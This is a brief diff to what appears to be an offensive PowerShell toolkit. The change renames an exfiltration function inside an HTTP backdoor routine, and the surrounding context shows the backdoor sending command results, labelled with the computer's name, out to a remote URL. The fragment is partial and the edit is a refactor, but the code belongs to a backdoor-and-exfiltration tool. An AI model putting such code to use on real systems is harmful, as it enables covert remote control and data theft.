@@ -186,7 +186,7 @@ function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, 
         if ($exfil -eq $True)
         {
            $pastename = $env:COMPUTERNAME + " Results of HTTP Backdoor: "
-           Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
+           Do-Exfiltration-HTTP "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
         }
         if ($exec -eq 1)
         {
@@ -203,7 +203,7 @@ function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, 
 
 
 $exfiltration = @'
-function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
+function Do-Exfiltration-HTTP($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
 {
     function post_http($url,$parameters) 
     { 
